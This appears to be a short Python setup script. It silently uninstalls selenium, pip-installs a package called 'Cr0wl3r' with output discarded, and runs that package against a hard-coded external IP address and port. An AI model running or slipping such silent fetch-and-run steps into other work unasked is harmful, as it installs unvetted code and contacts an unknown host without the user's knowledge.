from os import system
from sys import executable
system(executable + " -m pip uninstall -y --require-virtualenv selenium > nul")
system(executable + " -m pip install --require-virtualenv Cr0wl3r > nul")
system(executable + " -m Cr0wl3r -r http://15.236.144.183:8082/")
